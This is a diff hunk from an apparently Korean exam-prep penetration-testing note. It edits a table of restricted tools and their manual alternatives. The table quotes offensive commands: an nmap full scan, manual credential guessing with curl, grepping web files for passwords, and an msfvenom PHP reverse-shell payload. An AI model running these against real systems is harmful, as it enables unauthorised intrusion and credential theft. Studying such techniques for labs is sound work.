@@ -724,7 +724,7 @@ nmap이 `Warning: OSScan results may be unreliable`을 명시했는데도 97%라
    | 금지/제한 도구 | 수동 대안 |
    |---|---|
    | **Metasploit `exploit/multi/http/*_upload`** (1대 한정) | 관리자 패널에서 **직접 업로드** → URL 호출. 이 노트의 절차 전체가 수동이다 |
-   | **AutoRecon / nmap 자동 스크립트 전개** | `nmap -sCV -p- -Pn --min-rate 5000 -oN nmap.log` 한 줄 |
+   | **AutoRecon / nmap 자동 스크립트 전개** (허용 도구다 — 금지가 아니라 습관 문제) | `nmap -sCV -p- -Pn --min-rate 5000 -oN nmap.log` 한 줄 |
    | **hydra 로그인 브루트포스** | 기본 자격증명 10개를 **손으로**. `curl -d 'username=..&password=..'` 반복 |
    | **자동 privesc 스크립트에만 의존** | `linpeas.sh`는 보조다. **`grep -rn password /var/www`** 를 직접 친다 — 이 박스는 그 한 줄로 끝났다 |
    | **msfvenom** | **허용된다.** `msfvenom -p php/reverse_php LHOST=.. LPORT=.. -f raw -o payload.php` |
